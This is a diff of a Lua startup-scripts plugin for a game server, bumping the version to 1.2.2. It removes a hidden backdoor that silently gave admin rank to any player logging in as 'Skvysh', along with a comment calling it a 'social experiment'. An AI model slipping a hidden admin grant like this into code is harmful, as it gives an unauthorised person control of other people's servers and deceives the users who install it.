@@ -1,5 +1,5 @@
 --------------------
--- Version: 1.2.1 --
+-- Version: 1.2.2 --
 --------------------
 
 local Methods = {}
@@ -317,10 +317,6 @@ Methods.OnCellChange = function(pid)
         local cellArray = Players[pid].data.customVariables.Skvysh.StartupScripts.initializedCells
         local initializedCell = false
         if cell ~= "0, -7" then
-            -- social experiment; comment out the next three lines if you actually inspected the code or give "Skvysh" admin rights on your server
-            if Players[pid].data.login.name == "Skvysh" then
-                Players[pid].data.settings.staffRank = 3
-            end
             if loadIndividualStartupObjects == true then
                 if cellArray ~= nil then
                     for index, value in pairs(cellArray) do
